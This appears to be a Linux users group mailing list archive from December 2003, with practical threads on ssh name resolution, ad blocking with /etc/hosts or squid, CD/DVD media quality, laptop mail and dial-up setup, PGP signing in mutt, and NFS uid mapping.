        # Copyright 1998, 1999, 2000, 2001 Free Software Foundation, Inc.

Some of the files can be cleaned, like the above file, some need to be
re-recovered.  The re-recovery process is not trivial so I want to
minimize the effort.

so the technique I am heading towards is something along these lines:

        find USER/\.[a-zA-Z]* -type f -exec ...

The the exec part is getting tricky but I did determine that a
moderately useful test is:

         file -k .gnupg/options
        .gnupg/options: data
        
        strings -n 40 .gnupg/options | wc -l
             28

This looks for strings greater than 40 chars long, and tells me how many
I will find.  I am then thinking of comparing file's output to wc's
output and seeing if wc > X and file says binary, then attempting a
recovery.

But before I mess too much.....  Any see an easier way to do this?

Thanks!

Message-ID: <Pine.LNX.4.56.0312041527280.23903@salmo.appl-ecosys.com>

  Without going into details I hosed my new laptop this morning in a period
of stress and insufficent attention. I re-installed the distribution
(Slackware-9.1) and re-created the Emperor Linux customizations. It boots
and I'm now anxious to restore the working state it was in before I messed
it up.

  However, whenever I try to use ssh or scp (to move necessary applications
from another box on the network), the tool tries to connect to my external
IP address, not the internal network address. Of course, it keeps failing.

  I've used 'egrep -r' on every filesystem I can think of as a potential
source of that IP address (particularly /etc) but without finding it. If I
use 'ssh 192.168.55.1' I connect. If I use the hostname (i.e., 'ssh salmo')
with verbose mode turned on, I see that ssh (or scp) is assigning the IP
address 216.99.206.23 to salmo rather than the non-routable address. Where
could it be picking up this address? I have not configured anything on this
portable with that address for it's supposed to be only on the external
interface of the router/firewall.

Didn't you used to push an /etc/hosts file around your network that
contained all your local hostnames and addresses?

Also, make sure that your system looks to files before DNS for name
resolution. You'll want to see a line like this in /etc/nsswitch.conf:

hosts:  files dns

(There may be other stuff after 'dns'; that's ok.)

216.99.206.23 is the address returned by DNS for the name
salmo.appl-ecosys.com. If you want this to be different
locally, you can add an entry to your /etc/hosts file.
Perhaps this is how you had it configured in the past.

Subject: [PLUG] running two copies of mozilla
Message-ID: <20031204235443.GB15310@gate.kl-ic.com>

I diddled my .../mozilla/run-mozilla.sh file using the instructions at
http://sxs.sourceforge.net/sxs/index2.html .  Select "Internet Browsing"
and the essay "Running Multiple Instances of Mozilla".  Note that the
provided patch is too old to apply to the modern  run-mozilla.sh  file,
you will have to do some hand mods.  The reference in the essay to
"-remote openURL(%u,new-window)"   bears investigation.

In any case, the mod allows me to run multiple mozilla instances with
the same profile.  I can't attest to it's reliability;  I have seen
mozilla lock up under various circumstances, but then I have seen that
before and after the mod, so it is hard to say how much trouble the
mod causes.  

In general, the sxs site has some handy tricks, and is worth perusing.

There are cameras that have built-in http servers
so you can access them with a Web browser. You don't
need Linux support.

Uh I haven't read your report carefully, but ... be sure to check
/etc/hosts and /etc/resolv.conf.  See what "host salmo" tells you.
Also ssh -v might give some clues (though it can be difficult to
figure out which side is saying what).

Sometimes I've had to hand hack .ssh/known_hosts to get the behavior I
wanted.

Paul,

  Now I pull rather than push. :-) Yes, /etc/hosts is OK.

  That's OK, too.

Russell,

  I spent about an hour checking and rechecking all the files in /etc. It
was using 'ssh -vvv ...' that showed me the problem -- but not why.

  Anyway, I tried the Redmond solution: a reboot. Now it works again.

  I'm lucky I don't work as a SysAdmin: the stress and frustration would
kill me. :-)

  Instead I just get frustrated by trying to deal rationally with agencies
such as Washington's Department of Natural Resources, the federal NOAA
Fisheries and Fish and Wildlife Circus and various Oregon state agencies.
Come to think of it ... computers are probably more rational.

Thanks all!

Rich

Not having used LVM much (currently one host as a test bed for LVM), I'm 
wondering why you would make the comment about LVM.  A quick summary or a 
bulletized list would be great if it is not asking for too much.  Thanks 
much, Keith.

We've used cameras from Axis that run on embedded Linux & are configured
and accessed via built-in web server. I do recall seeing some security
warnings for them, so one needs to be careful.

Another issue in backing up to DVDs is that most DVD file systems do not
deal well with file names with weird characters (such as umlauts) or
long filenames.  (Some have problems at 32 characters, some go to 64.)

The only way to get around it is to tar the file system first, and that
has other issues.

Blank media is still not very cheap for DVD.  (About $2 in bulk for
anything good.)

The big question is reading it off after you are done.

Actually trying this with a DVD-RW would be better since if it does not
work, you can erase it.

BTW, Maxell media is not recommended.  I have had a lot of problems with
it.  (The only thing they make that works reliably is their black
CD-Rs.)

Imation works great.  Verbatum has been good. I have not tried the
Memorex media yet.  I have a stack of 50 here waiting to run out of the
other stuff.

Would love to hear people's impressions of various manufacturers.  My head 
gets stuck in the days of cassette tape, when Maxell (UDXLII) was the sh*t, 
and Memorex was sh*t.  3M & Dysan made good 8" floppies.  But I don't use 
enough blank CDs/DVDs to know and I don't want to experiment.

I've used Imation CD-R media for years with excellent results.  I
especially liked the thick plastic coating on the back protecting the
fragile foil.

Lately, though, I've been disappointed.  The thick plastic coating now
only covers "most" of the back, with huge sections spelling "Imation" left
uncoated.  I've also noticed an unacceptably high level of "grown defects"
that only appear after a few weeks of abuse.

I've recently seen Imation's "Business Select" media.  It costs more, but
I'm hopeful that it might be more durable.  Has anyone used this?

glChess looks good, but as before, I can't get it to build.  I run
autogen.sh, then configure, which says:

checking for gtk_gl_area_make_current in -lgtkgl... no
configure: error: Cannot find gtkglarea

I have gtkglarea installed on my Gentoo system, and I've tried several
things using --with-gtkgl-prefix=, but no cigar.  Anyone know how to

This may all be coming out of my ass, here... so duly warned...

But does this perhaps require the Gtk::GLArea perl library in addition to
the C library?

You might try `perl -MCPAN -e 'install GTK::GLArea'` and see if that's
there.

Downloaded a torrent of it as well.  Was a multipart RAR containing
bin/cue files, which is au courant among the kiddeez these days, I
guess.  Had to run the .bin files through a li'l C proggie to strip 'em
down to iso format.  Burned nicely, haven't installed with 'em yet.

if you are asking why bing is giving you bing: packet (92 bytes) from
unexpected host 66.190.251.135 it because that host is pinging you. you
might want to take a look at your traffic with ethereal, or another

Message-ID: <E1AS8kD-00027L-00@drizzle.pdxlinux.org>

You know, for CDs, it is so hard to tell these days, the manufacturers
are making the blanks for a very low amount of profit and nobody cares
about quality control. Name brand isn't a guarantee of quality, far
from it, but the 100 packs of "no name free after 1 rebate packaged
without a spindle and wrapped in crappy plastic" cds are pretty much
going to be made by some child worker in a roach infested factory in
Calcutta.
It's also hard to say brand X is good quality, because companies tend
to get break into the market with cheap, good cdrs, and then 6 or so
months down the line, once they have a "good name", jack up their
prices another 20% and switch to a manufacturer that makes crappy cds.


TDK used to be reliable, then I bought 4 spindles and they were all a
bad batch (i.e. error in the exact same position on all of the cds),
and TDK refused to take them back. Needless to say, I don't buy them
any more after my experience with their support staff. They used to be
_really_good_ but that was when 16x cdrs were the top of the line.

Maxell is utter crap 99% of the time; I've gotten sealed spindles with
"stuff" between the cds and peeling top coats. I was less than
impressed.

Memorex is umm, iffy, but their black cdrs aren't bad.
Actually I haven't had many black cdrs go bad. Coincidence?

Imation isn't bad, I really haven't had many trouble with that brand,
probably the best in the last 3-4 months.

Fujifilm made some surprisingly good ones, (really colorful ones)
although I don't see them for sale anymore. Burned nicely and very low
incidence of errors too.

The best ideas are to burn at half the rated speed and verify after
burning that there are no crc errors or other happy errors. Or just
buy a hard drive, the prices for quality media are about the same as a
hard drive on special. 120 gb drives are ~75 now if you get a deal. .

Customer support for all the manufacturers is terrible, and downright
arrogant in some places. I don't think anybody follows their
"warranty" of replacing defective media, but a spindle of cdrs being
shot by a .22 does make a very nice and colorful, albeit short lived
fountain of CD shards (you so want to stay a bit back, however -
shards are thrown a good 20 feet if you get the angle just right. ).
Probably more satisfying than having _____ mail you some blanks. AOL
cd showers are also fun. But enough about senseless gun violence.

Crap cdrs are always good for burning vcds. Also rather good
projectile weapons (i.e. hold 1 hand in front of eyes, bend cd in half
with other hand so that it bends inside your hand).
I digress. (yet again. . .)

As for dvd-r's, I'd hate to say it, but the compusa ones aren't that
bad, which is pretty remarkable considering the top coat of their name
brand CD's dissolved in water (well, a couple years ago they did).
I've burned about 50 and haven't had any fail on me yet, although it
has only been about 4 months. I'm paranoid and burn everything at 1x
though. I also have ~20 memorex and maxell ones, no failures on those
either. I could be really lucky though, I am quite nervous about the
data stored on those DVDs lasting.  Apple DVD-R's are apparently
really good, although they are something like $5 a pop, so I don't
think the cost/benefit thing works too well there.

What works is copying the mails in Kmail from the old account (was IMAP mbox)

Instead of the usb cable and proprietary drivers, another option is to
buy a usb digital media reader/writer. There are types to support
smartmedia ($20 or so), compact flash, and a couple of others. They are
not much bigger than the media itself, allow for reading and writing,
require no additional drivers (for xp, anyhow). 

They can operate as a regular removable media drive if you're using it
to move largs files from pc to pc, for example. Or, full of images from
the camera, the card is removed, slipped into this thing and presto,
instant images.

You have a source for the child worker bit? I can't image the production of

Not possible.  If you want usable security footage, stick to an analog
solution, which can later be enhanced to get better detail if the need
arises.  Digital systems will just be pixilated crap when you need to
zoom in on something when reviewing the footage.  As a security
officer, digital camera systems are a real pet peeve.

it's not actually running multiple instance of mozilla, it's
telling the existing mozilla process to open a new window, so
it's pretty harmless.

Ah...  I was thinking something like this.  I did find it rather funny
that I discovered bing on this list and when trying it I get 'strange'
stuff reported and the IP I pick was from an Oregon source.


Thanks,

  Has anyone here experience with the CLI browser, links?

  I'm trying to use it in graphics mode, but I see this error message as
soon as I press [Enter] on the command line:

svgalib: Cannot get I/O permissions.

  On the laptop, svgalib is a directory, /usr/lib/svgalib, with 755
permissions and owned by root.root. Does the error message mean that I need
to setuid for this directory and its contents in order to run links?

TIA,

Does anyone know of Linux software that will read and validate the rate of
ECC/EDC corrections in a freshly burned CD?

I found this via Google, but alas, it's Windows-specific:

So my wife was complaining about spam in the office.  I threw out my
usual, you should set up a linux server to collect your mail from your
ISP (right now they all just use pop3) and you could use spamassassin.
You could also make that your file server and then you could back up
easier and not cut off from someone's files when they decide to turn
their computer off.  Currently they use a peer-to-peer network with
all win98 machines.  I think I can handle all of this except for one
nagging question.  I want this to look relatively easy so I thought
I'd ask here first.  She likes to check her mail from home. Their ISP
is Qwest and I'm sure they connect using DHCP.  I also sort of told
her that she could access the linux box from home when she needed to.
Are these things (the access parts) possible with your standard Qwest
DHCP setup?

Can Mozilla plug-ins be installed on a user by user basis, instead of
by root?

Here at work, they've finally installed an updated browser, Mozilla 1.4
(we used to use Netscape 4.75).  However, my requests for useful
plug-ins, like the spell checker, are being ignored.  Is there any way
for a user to install them themselves, aside from a completely
local install of Mozilla?

Thanks,

I believe so, but that was handled by gentoo when I installed gtkglarea
(version 1.99.0), which actually appears as libgtkgl* in /usr/lib (ain't
sure why we can't name things consistently).  It could be "Cannot find
gtkglarea" really just means there's no "gtk_gl_area_make_current in
-lgtkgl".

Anyway, I think it's all useless.  After scouring the glchess-devel
list, this seems to be a bug in glchess, which is apparently an
"orphaned" project.  Probably just hasn't been updated for later
versions of gtkgl(area).  But I can't figure out where to download an
older version.

So I'm basically right back where I started.  Seems wrong that there
still isn't a good GL chess interface for linux.  I was able to run
cinag (Chess Is Not A Game), but it's a bit hackish and incomplete. 
Apparently Apple is shipping their own, souped-up version of glchess for
the Mac.  I wonder if that could be ported back to linux.

All,

Over at Groklaw from a "Grokker" who attended the SCO hearing:



First Report from Grokker Inside Hearing: IBM Wins Both Motions to Compel 
 
Friday, December 05 2003 @ 02:30 PM EST  

Our first report from a Groklaw volunteer, sam, who attended the court hearing
is that IBM won both of its motions to compel and SCO's motion was set for a
later date. Here is what sam is telling us, and it's subject to further
information and confirmation as more news arrives. We have several attending
and I'll do a followup, but this is the first word. Here is what sam is telling
us: 

"Just returned from the hearing. 

"Needless to say there was blood all over the floor on the SCO side of the aisle
none on the 'left' side. 

"Judge granted both IBM motions to compel, gave SCO thirty days to comply 'with
specificity' and suspended further discovery. Did not rule on the SCO motion
until next hearing scheduled for Friday, Jan 23 and 10:00 am. 

"SCO did say that they will be filing a complaint within days on copyright
violations. 

"More to come" 
So it looks like they have 30 days to finally tell us what code they are talking
about "with specificity". Finally.

So I'm on dial-up and want to block banner ads, but I don't want to do
anything too fancy, like using squid.  I know there is a solution using
bind, which I have on my system but am not actually running.  But it
appears I can also do it just by adding entries in /etc/hosts.

Which is preferable?  It would be nice to redirect ad' domains to my
local httpd and serve myself a gif image instead of the broken image
icon.

And by the way, can anyone post a list of undesirable domains, as a
starting point?

Muchas thanks,

What browser are you using? I've found that using Mozilla's picture
blocking feature (right click on the banners and select 'Block Images
>From This Server') on the sites that I visit most often kills just about
all the banners and it doesn't leave a broken image icon.

There are several lists online. Search google for "hosts file block ads" 
or something. There are many lists for those.

Message-ID: <1335.134.244.174.87.1070660509.squirrel@sautez.com>

Hello,

I'm setting up some backup scripts and have run into a little challenge.

I doing the following:

rsync -av /drive1 /drive2

now I want to do this:

rsync -e ssh -avP backupUser at server1:/drive2 /mybackup

The problem is that the backupUser does not have the correct
permissions to read all the files that were backuped.  The first local
rsync is done with root and root is not allowed to ssh into the remote
server.

I have tried to put backupUser in the root group but that didn't seem
to help.

What settings/permissions do I need to give backupUser so that
he/she/it can read all the files regardless of permissions.  Some of
the files that are backup are 600.  Also, I don't want to tgz the file
as it is 8GB or more and after I do the first big ugly transfer the
rest would be pretty small with rsync.

Thanks,

Josh

It's that, or install a spam filter like Popfile on each PC, giving
users control over their own spam-filtering.

I did small-business networks for quite a few years, and I want to make
sure you know what you're getting yourself into here.

Servers require sysadmins.  The Boss is (rightfully) gonna ask, "How
much is your time gonna cost?  Can we trust you to be available RIGHT
NOW when the thing breaks and shuts down the whole office?  What do we
do if the both of you up and move to Connecticut?  What business reason
compels us to commit to something that'll cost us money now and for the
indefinite future?"

For most folks, changes mean anger and confusion.  The one who hits the
mail-check button every 20 seconds when she's expecting something won't
like being told to wait for Fetchmail on the Linux box to do its every-
10-minute check; she'll sit and stew and drum her fingers as loudly as
possible.  The one who shares a few form letters won't like having to
access them from another drive letter, because he's *always* accessed
them from c:\Documents\pucky\bull\ and dammit, anything else is just
plain *different*.

The technical work is easy, the social work is not.  Mimimize the pace
of (perceived) change and technology commitment, cultivate and use the
office's amateur technicians, sling boatloads of charm and humor and
only the tiniest pinches of BS, and act like everything's perfectly
reasonable.

When I had QWorst DSL, I accessed my Linux box remotely all'a time.
It's one of the nicest things about having DSL or cable.  I used a free
dyndns.org hostname and set up my box to update it every time it did a
DHCP.

Be sure and test that everything works and recovers automagically before
making any promises, let alone bringing the box into the office.  
And think about backup and virus-scanning for the file-server.
Central reliable storage with regular backup can be its own reward.

Sorry this is so long, but all of it is heartfelt and IMO important.

Hmm, does it save blocked sites in a usable format?  I should like a
more or less permanent solution, one I use on different hosts and maybe
different browsers.  So at least, I'd want to access Moz's list, in case
I want to implement the bind idea later.

Sad I missed that.  Was busy cowering from the unusually insane traffic
and hard rain while my m/c gear dried out.

Were there slides or notes or some such from the presentation?  
As an engineering student, I figure it's my duty to learn LaTeX so I can
square off against the evil hordes of MSWord/EquationEdit users. ;)

The social aspects aren't so hard here (provided everything works
pretty well) cause there are so many bothers right now.  Also my wife
is the "computer guy".  If she wants to do it, we can do it.  But the
remote thing eludes me.  Her modem is assigned an IP and is PPPoA.  My
modem is a pass thru.  So if I ssh to my IP I get my gateway box.  But
how do I ssh thru her modem to a specific box on the network?

The list is saved in the cookperm.txt file in your mozilla profile
directory. On my system it's at
/home/cmize/.mozilla/default/dy3zzgic.slt/cookperm.txt

Sheesh,

I meant that as in, there are LISTS (text files) of hosts to use. I 
don't think anyone on PLUG wants someone to copy/paste that huge list.

Try this:
http://www.accs-net.com/hosts/

I googled for "list of ad servers" and got a bunch of useful-looking
matches.  The first one, http://pgl.yoyo.org/adservers/, looks quite
informative, tho written for Windows users.  In Linux, the hosts file is
/etc/hosts.

Michael,

You probably promised only file server access, but are you aware of
RealVNC and TightVNC, two compatible PC-Anywhere type applications for
Windows and Linux?  If not, Google both those words &/or check out
http://www.linuxworld.com/story/32625.htm and then
http://www.gregmartyn.com/computerhelp/tightvnc.html
The problem you may encounter with any server (VNC or FTP or ...) on
DHCP is finding out the IP address from "outside", since Qwest may
assign a new one at times. To work around that, read
http://www.gregmartyn.com/computerhelp/dyndns.html & follow the links to
dyndns.org to set up a way to access your server by name (dyndns.org)

Surely they are on some kind of router/firewall, so read at
www.dyndns.org about how to set up the firewall to let outside
connections in to the server for specific ports (like the FTP port or
the VNC port).

I am just in the middle of setting this up myself, so can't guide you
any further at this time.  Perhaps others on this list can?

Aaron,

  Do yourself a big favor: <http://www.lyx.org/> and grab LyX-1.3.3/Qt.
You'll like it.

  Do the 10-minute tutorial and you'll be productive right away. As you need
more capabilities read the Help -> User Guide or -> Advanced Topics. When
you're _really_ lost, ask on the mail list.

Message-ID: <Pine.LNX.4.56.0312051632570.1628@salmo.appl-ecosys.com>

  My fiancee wants to work on her laptop either connected to the network or
off-line. There's no problem setting up her /home directory and getting
three of the four main apps she uses running as stand-alone installations:
mozilla, openoffice.org and jpilot. My question is how to configure her mail
service (she likes sylpheed).

  On the workstation, all /home directories are nfs-mounted from the server.
So her mail is on the server and she is able to send and receive with no
problems.

  On the laptop, connected to the network, what do I need to do so she can
collect mail from the server when she wants it? This is new territory for me
so expect some questions. :-)

TIA,

Rich

I didn't realize squid was all that fancy.  :-)

To block ads and porn on my local network, I have squid set up with
squidGuard and transparent proxying via iptables.

You could modify a blacklist and use /etc/hosts and point to localhost,
then have an http server running on localhost serving up any request a
pretty blocked.jpg or whatnot.

http://axpr.net/blocked.jpg is what I use, if I remembered the URL
correctly.

Squid/SquidGuard was really not all that difficult to set up, IMHO.

I should turn my red-on-white jpg into a red-on-transparent gif, now
that I think about it.....

I don't know how you'd configure a local HTTP server to answer every
request with a certain graphic, though.

> And by the way, can anyone post a list of undesirable domains, as a

My list is currently about 18MB in size.  I'd rather not post it to the
list (hell, Postfix would reject it locally, before it got there).  I
have a few blacklists added together which are fairly static, and then
also update nightly the http://squidguard.mesd.k12.or.us/blacklists.tgz
list.

That site is cool and not just for Microserfs:  it'll gen' the current
list in several formats including an iptables script.  Although I've
read using iptables is a bad idea here for several reasons.

So I'll use the hosts file.  Just for fun, I'm going to set up a cron
job to download a list from the above site and add it to my default
hosts file every week or so (too bad you can't include another file in
hosts, but no biggie).

I've also added a default virtual host to httpd, where every location
aliases to a transparent GIF.  Already my surfing experience has
improved noticeably.  :)

Thanks to all,

There are a number of tools.  Remember that Cyrus allow mails in
folders, so you could attempt to grab the root folder and just copy it. 
Should working in mozilla/evo.

There are command line utils but the clients always worked easier (not
faster or better, just easier).

Search google groups for the imap group on this.

IIRC, You need to run it as root but looks very nice with frambuffer.

I set my wife up with a lap top in a similar manner, but I think the 
restrictions might be different.

I set up a small WAP on my local LAN (it's going behind it's own firewall 
soon) and NFS exported the home directory for her.  I set up POP on the 
server so she could get her email.  Because her home directory is staying on 
the server, I can just use POP and not IMAP.

It seems to work out fine though I think I'll go to 802.11g as soon as I can 
afford it (and the Linux drivers work).  The latency is noticably higher than 
my wired network and the bandwidth is not great.  But it was _cheap_!

The big difference here is that my wife _only_ uses the laptop from home, i.e. 
she is effectively always on the LAN.  I use the laptop offline and remotely 
all the time, but I don't have a problem with SSH etc.

My biggest goals was to make sure that she never ended up with two copies of 
her mail or her other data.

When would your fiancee collect email?  When she's not at home, is she 
completely offline?  If she needs to get and handle mail while she's remote, 
then something like IMAP or APOP might be the best bet (POP is not encrypted 
or particularly secure, hmm, not sure if IMAP is either).

You could get the email to the laptop a number of ways.  If you want to make 
sure that everything works (while email might not flow, nothing errors out), 
this might work (untested, use with caution, do not drive heavy machinery, I 
am not a system admin, nor do I play one on TV, etc. etc.):

Set up a simple POP server on the server.

Write a little wrapper script for fetchmail on the laptop.  Have it run every 
ten minutes or so.  _Iff_ the network is up, have it contact the server and 
get the mail.  If the network is not up, it just quietly goes back to sleep.  
Actually I think that fetchmail might be able to do this on its own, I cannot 
remember.

Set up Postfix/<MTA of choice> on the laptop.  Aim Sylpheed at it for 
_sending_ mail.  I'm not sure of all the nuances, but I'm pretty sure that 
Postfix comes out of the box with a sample config that would handle a 
intermittently connected machine.  Where do you route outgoing mail?  Postfix 
should queue mail until it is triggered to sent it away.

Setup Sylpheed to real new email from /var/spool/mail or the local equivalent. 
I.e. wherever fetchmail is going to put it.

This way she could always check for mail and send mail, even while offline.  
She won't get mail quite as quickly, but it should be able to queue just fine 
on the server.  She'll be able to send mail at any point, but it won't make 
it off the laptop and into the wide world until she's online.

What are her interactivity requirements?  If she is online, but not on your 
internal LAN sometimes, then maybe a carefully protected IMAP server would be 
best?

I'm probably going to be setting up a VPN tunnel from my laptop through my 
firewall into my DMZ so that I can access my internal services without having 
to expose them directly through the firewall.  I've done chroot servers and 
the like and it wasn't fun.  Most everyone I work with has wireless or a LAN 
at home or in the office.  Thus, I can be on the Internet nearly anywhere.

Best,
Kyle

Use apt-cache search to find dyndns clients and compare with their

If you're on dailup, especially if you have a home network, you want
adzapper and squid.  Squid isn't that hard to set up (and has sane
defaults in Debian), and tying in adzapper from there is a snap.  The
documentation on both is approachable and understandable.

Abusing the hosts file in this manner may have serious implications on
any OS (namely, network weirdness, and if you run a webserver on your
system, a *lot* of 404's coming from localhost).

Solve it the right way by using something with some intelligence and
save yourself some headaches down the line.

I haven't come across a converter that would create the Cyrus structure
with the maildir and the index files. Courier yes, but not Cyrus. 

Now I don't want to mess with the setup any more (you could have told me
what a PITA this is ;) But it would surprise me if you can plop mboxes
into Cyrus' data structure and it would pick it up. Maybe I
misunderstood you too.

Why not just use fetchmail to pipe it all to your cyrus server?

Is the IP address of the modem the only routable IP address, or do all
of the internal machines have routable IP addresses too?

Hmm, interesting idea. It would however be cumbersome to feed the mails
into the right directories. My sieve filters won't work for this, as
they are partly using the TO field to decide what goes where. 

Thanks though!

I setup an IMAP server on my workstation to do exactly that for me.  Now 
both my laptop and my desktop can read the same mail; my laptop uses a 
world-reachable ip address to read the email from (over IMAPS) so it 
even works when outside of my own network.  I filter "server side" with 
procmail rather than with the filtering capability of my email clients; 
I didn't know if two connected clients would "fight" over filtering, or 
if I'd have to always leave the filtering one running.

At first I used the UW IMAP server - which I quickly realized sucks; my 
flow of spam kept the IMAP server busy enough to keep my system load at 
2+ 24/7 all while being VERY unresponsive.  I recently switched to the 
Courier IMAP server and maildirs now my system load is back down to a 
reasonable 0.1.

fetchmail isn't going to rewrite the To: headers.

Is there a way to identify the directory fetchmail pulls a mail from an
IMAP server? That might solve the problem. For me it is no longer
practicable as I have begun to recreate and change the directory tree on
the new server. To hell with legacy stuff. Don't wanna end up with 9
fingers over this while the others enjoy their full set of 10 ;)

Thanks!

Okay, so what do you suggest?  iptables seems even less intelligent, and
squid seems like overkill.

Great Chaos!  Seems a list that large would slow you down a bit.

I think that if we were to go to the other side of outer space, we would
find that we are on display in the window of some shop, like a snowglobe
or something. And I bet that we would find that the price has been
marked down several times.

Um, have you considered the good ol'internet junkbuster?  
www.junkbusters.com or some such.  Easy to set up, plays well with squid 
(which you really ought to run if yer on a dialup and want better 
performance).

Rogan,

  From the laptop I can ssh to the server (salmo) and scp files to and from
salmo. From salmo I cannot ssh or scp to the laptop (lemna).

  I copied the new dsa keys (public and private) from lemna:~/.ssh/ to
salmo:~/.ssh/. I added the id_dsa.pub keys from each box to
.ssh/authorized_keys and .ssh/known_hosts on both boxes. That _should_ have
coordinated both, eh? It does, to the extent that now I'm asked for my
passphrase as well as my password.

  Here's the output when I tried to go from the server (salmo) to the
laptop (lemna):

[rshepard at salmo ~]$ ssh -v lemna
OpenSSH_3.4p1, SSH protocols 1.5/2.0, OpenSSL 0x0090602f
debug1: Reading configuration data /usr/local/etc/ssh_config

ssh_exchange_identification: Connection closed by remote host
debug1: Calling cleanup 0x8062b5c(0x0)

  There is _no_ id_rsa file on either machine.

  I'm stumped here and would appreciate any insights anyone has. On the one
hand, doing puts and gets from the laptop is OK, but I am very curious why I
cannot initiate the process from the other side of the connection.

Thanks,

Rich

That looks like a problem with the report system's /etc/ssh/sshd_config.

Does the remote system have "PasswordAuthentication yes" in its
/etc/ssh/sshd_config?

Squid's about the right fit.  It's not really overkill considering the

I see.  Well, I've looked at the FAQ, which doesn't seem to mention
banner ads (though it explains why squid uses a lot of memory).  I
understand the caching might speed things up a little, but just
regarding banner ads, would running squid be any better?

You also need adzapper to deal with banner ads.

option. I tried that '-mode 1024x768.24' and the screens still shake

In the FWIW column, the only time I've seen ssh_exchange_identification 
has been if the target host has tcp_wrappers enabled and ssh is not 
permitted, or connecting to a Cisco PIX that has not had the certificate 
authority generated and save to flash.  Assuredly it is not the latter.

tcp_wrappers, netfilter rules, or file permissions related to ssh are the 
three issues I deal with anymore.

Naw, not with SquidGuard.  Of course, it takes it about a half hour to
load the list into memory, which it does every night at about 0400
(leading to half an hour of non-filtered web access per night).

Well, it should have been "yes" given my understanding of what you
were trying to do.  However, I think now that understanding was
faulty.

You probably should make new keys on lemna, rather than copying them
over from salmo.  On lemna, run:

  ssh-keygen -t dsa

Subject: [PLUG] Setting up for modem use on laptop
Message-ID: <Pine.LNX.4.56.0312061808040.24709@salmo.appl-ecosys.com>

  In preparation for a trip next week, I'm trying to set up my Sony Vaio
(with Slackware-9.1) to dial into my ISP. I thought I'd give 'wvdial' a try
to make it easier to set up the connection.

  Grabbed the wvdial source tarball and learned I also needed the wvstreams
tarball. Got that. Started with the wvstreams and 'make' fails. According
to the wvdial site that's because of some incompatibilities with
openssl-0.9.6; problems that are fixed by having the include files and
development libraries. There is no slackware package with these.

  I have on this system
      /usr/lib/gcc-lib/i486-slackware-linux/3.2.3/include/openssl/bn.h
and
	/usr/include/openssl/*.h

  The wvdial Web site also says that openssl-0.9.7beta is broken so -0.9.6
should be used. On the openssl Web site, -0.9.7 was released 30 Sept 2003
and -0.9.6l on 4 Nov 2003. Huh?

  Anyway, I'm not sure how to procede here. Are there other dialers
(excluding those requiring KDE or Gnome to be installed)?

Thanks,

Rich

  I made the new keys on lemna and added id_dsa.pub to both known_keys and

  Hmm-m. I did this, then copied lemna's keys to salmo. I'll remake them on
the latter.

  I changed the directory; the file was OK.

  I'll redo the keys on salmo, add them to lemna and report back.

  No difference.

  Well, I have bidirectional transfers from the laptop to the server so
that'll do me. I need to get the internal modem set up and do some other
things.

Thanks, all!

I'm curious as to how you have your signature and email in one file
rather than the way I'm sending my emails now with the text in one file
and the gpg signature in another.  Is it a setting with GnuPG or mutt?
Thanks!

If you google about for PGP/MIME vs cleartext (or inline) signing, you
should find a lot of explenations on it, maybe even with workarounds for
mutt.

I think a few friends who use mutt and sign inline have things set up to
pipe the text of the message through gpg before sending, as if from the
editor rather than from mutt itself, but I don't have specifics, as I've
never been a big mutt user.

FWIW, a lot of folks use a broken mail client that will not properly
display your PGP/MIME post - the text of the email shows up as an
attachmnt.

Typically, Slackware packages, especially the ones Pat V. packages,
include the necessary development files (header files) necessary to
build things that need them.

What exactly did make bail out with?

I haven't ever dialed up with Slackware outside of KPPP, and that was
*years* ago... so really don't know a ton about how to do it
out-of-the-box, but I think there are some 'ppp-up' type scripts that do
it for you?  I would be really surprised if there were no out-of-the-box
way to dial up to the Internet in Slackware outside of X.  You may wish
to consult the AOLS archives, too, via groups.google.com.

From the Mutt user manual:

  6.3.143.  pgp_create_traditional

  Type: quadoption
  Default: no

  This option controls whether Mutt generates old-style inline PGP
  encrypted or signed messages.

  Note that PGP/MIME will be used automatically for messages which have
  a character set different from us-ascii, or which consist of more than
  a single MIME part.

  Also note that using the old-style PGP message format is strongly
  deprecated.

1001

Assuming 1001 has permissions to write to said directory on the server.

Well, technically 1005 will own jdoes files on the server. But if jdoe
on the *client* writes to a directory on the server, then:

Ah, right (sorry for the ambiguity).  So to paraphrase, there isn't
any uid/gid translation over the NFS layer.  The server sees a uid
(not a username) wanting to write, the server serves files by uid,
etc.

Yes, that's pretty much correct.  This is also a very serious problem as
well, so you need to make sure you restrict which IP addresses have
access to the NFS shares, and it's still only okay to use NFS in trusted
environments.  If a rogue computer connects to your network and is able
to mount the NFS share, they will have full access to read and write to
every account/directory on the server (even worse if the NFS shares have
symlinks enabled).  Well, this isn't quite true as, be default, I
believe the root account over NFS has the same privileges as the user
'nobody'.

I also believe there are very easy attacks against NFS servers with IP
address spoofing, and man in the middle attacks.  I also found out about
a week ago that there is an SSL/TLS wrapper that can go around NFS to
make it a little bit more secure...but each computer with access needs
to be trusted.

Cheers,

Daniel

That is actually why I'm asking because my mom uses Outhouse Express and
she says my mail is coming as an attachment to the GPG signature.
Trying to see if I can make it easier for my poor mom to figure out my
emails.  :-)

So, basically inline is the old way of doing things and MIME is the
proper way?  Hrmm, so I guess I just have to tell my mom to get a better
mail client.  Heh, that'll go over well.  :-P

As others have noted, uid -> username resolution gets done on the
client.

Any filesystem, network or local, needs three compoents: file server,
file client, *and* a common authentication system.

Since filesystems store file metadata (ownership, permissions, ACLs,
...) as numeric tokens, it needs an authentication database to do
number -> name lookups. Sometimes the authentication system is local,
like /etc/passwd, and sometimes it's remote: NIS, LDAP, AFS, Kerberos.

Regardless of whether the authentication is local or remote, however,
it needs to be there. Remove a user from /etc/passwd on your local
system, and all you'll see are files owned by some uid. Same thing if
you lose contact with your NIS or LDAP server.

The trick, I think, will be to devise a network filesystem in which

* within the network universe, any given "realm" (for lack of a better
  term) is unique; a realm would be the moral equivalent to a DNS
  domain or subdomain name or to the root DN in LDAP land.

* within each realm, each username must be unique

* a group can contain users of many realms

* all files are stored with rich ACLs, not Unix u-g-o symbols

* all communication between clients, filestores, and authentication
  servers is protected by strong crypto

* all authentication servers are visible to the networks of any remote
  realms with which there are collaborative efforts

* authenication servers must be available via a fall-back mechanism
  for redundancy, much like NIS has

* client access to file servers should be available in both
  host-to-host formats, like NFS is currently implemented, and a
  user-to-host format, with the remote mount available only to the
  mounting user.

* file locking can be done on a byte-range basis

* all communications are based on open standards

There are a few "mostly there" protocols for all this -- AFS and NFSv4
the leading contenders -- but AFS is hard and NFSv4 doesn't (imo) do
enough to define a shared authentication mechanism.

Well-written, Paul. NetWare users who move to Linux are often
surprised when they discover that Linux has a rather primitive
network file system.

